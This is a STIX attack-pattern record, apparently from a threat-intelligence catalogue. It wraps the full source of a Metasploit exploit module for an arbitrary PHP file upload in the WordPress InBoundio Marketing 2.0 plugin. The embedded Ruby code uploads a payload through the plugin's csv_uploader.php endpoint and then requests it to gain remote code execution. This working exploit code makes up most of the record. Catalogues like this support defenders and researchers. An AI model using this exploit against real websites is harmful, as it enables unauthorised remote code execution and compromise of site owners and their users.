{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c9799cc4-6e26-48be-9ed1-3d7dae3d5fd7",
    "created": "2024-08-14T17:12:14.368086Z",
    "modified": "2024-08-14T17:12:14.368089Z",
    "name": "Wordpress InBoundio Marketing PHP Upload Vulnerability",
    "description": " This module exploits an arbitrary file upload in the WordPress InBoundio Marketing version 2.0. It allows to upload arbitrary php files and get remote code execution. This module has been tested successfully on WordPress InBoundio Marketing 2.0.3 with Wordpress 4.1.3 on Ubuntu 14.04 Server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_inboundio_marketing_file_upload.rb",
            "external_id": "wp_inboundio_marketing_file_upload.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7864"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Wordpress InBoundio Marketing PHP Upload Vulnerability',\n      'Description'    => %q{\n        This module exploits an arbitrary file upload in the WordPress InBoundio Marketing version\n        2.0. It allows to upload arbitrary php files and get remote code execution. This module\n        has been tested successfully on WordPress InBoundio Marketing 2.0.3 with Wordpress 4.1.3 on\n        Ubuntu 14.04 Server.\n      },\n      'Author'         =>\n        [\n          'KedAns-Dz', # Vulnerability discovery\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>'  # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['EDB', '36478'],\n          ['OSVDB', '119890'],\n          ['WPVDB', '7864']\n        ],\n      'Privileged'     => false,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['InBoundio Marketing 2.0', {}]],\n      'DisclosureDate' => '2015-03-24',\n      'DefaultTarget'  => 0)\n    )\n  end\n\n  def check\n    check_plugin_version_from_readme('inboundio-marketing')\n  end\n\n  def exploit\n    php_page_name = rand_text_alpha(8 + rand(8)) + '.php'\n\n    data = Rex::MIME::Message.new\n    data.add_part(payload.encoded, 'application/octet-stream', nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{php_page_name}\\\"\")\n    post_data = data.to_s\n\n    res = send_request_cgi(\n      'uri'       => normalize_uri(wordpress_url_plugins, 'inboundio-marketing', 'admin', 'partials', 'csv_uploader.php'),\n      'method'    => 'POST',\n      'ctype'     => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'      => post_data\n    )\n\n    if res\n      if res.code == 200 && res.body.include?(php_page_name)\n        print_good(\"Our payload is at: #{php_page_name}.\")\n        register_files_for_cleanup(php_page_name)\n      else\n        fail_with(Failure::Unknown, \"#{peer} - Unable to deploy payload, server returned #{res.code}\")\n      end\n    else\n      fail_with(Failure::Unknown, 'Server did not answer')\n    end\n\n    print_status(\"Calling payload...\")\n    send_request_cgi(\n      { 'uri' => normalize_uri(wordpress_url_plugins, 'inboundio-marketing', 'admin', 'partials', 'uploaded_csv', php_page_name) },\n      5\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-24",
    "x_mitre_platforms": [
        "php'"
    ]
}